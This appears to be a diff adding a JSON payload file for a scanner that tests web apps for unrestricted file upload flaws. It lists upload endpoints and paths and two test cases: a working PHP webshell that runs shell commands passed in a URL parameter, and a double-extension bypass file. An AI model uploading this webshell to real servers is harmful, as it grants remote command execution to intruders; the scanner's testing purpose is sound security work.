@@ -1,0 +1,28 @@
+{
+  "vulnerability": "Unrestricted File Upload",
+  "endpoint_keywords": ["upload", "file", "document", "attachment", "import", "avatar", "media"],
+  "upload_locations": ["/static/uploads/", "/uploads/", "/media/", "/static/", "/public/uploads/"],
+  "hidden_upload_params": ["file", "upload", "attachment", "document", "image", "avatar", "media"],
+  "cases": [
+    {
+      "id": "upload-php-webshell",
+      "filename": "shell.php",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "content_type": "application/octet-stream",
+      "severity": "Critical",
+      "cvss": "9.8",
+      "match_regex": "(?i)({filename}|successfully uploaded|file uploaded)",
+      "description": "Uploads a PHP webshell disguised as a document. Confirms the server accepts dangerous executable extensions."
+    },
+    {
+      "id": "upload-double-extension",
+      "filename": "shell.php.jpg",
+      "content": "<?php echo 'UPLOAD_PWN_DOUBLE_EXT'; ?>",
+      "content_type": "image/jpeg",
+      "severity": "High",
+      "cvss": "8.8",
+      "match_regex": "(?i)({filename}|UPLOAD_PWN_DOUBLE_EXT|successfully uploaded|file uploaded)",
+      "description": "Double extension bypass — server sees .jpg but stores .php.jpg. Confirms extension-only validation is bypassable."
+    }
+  ]
+}
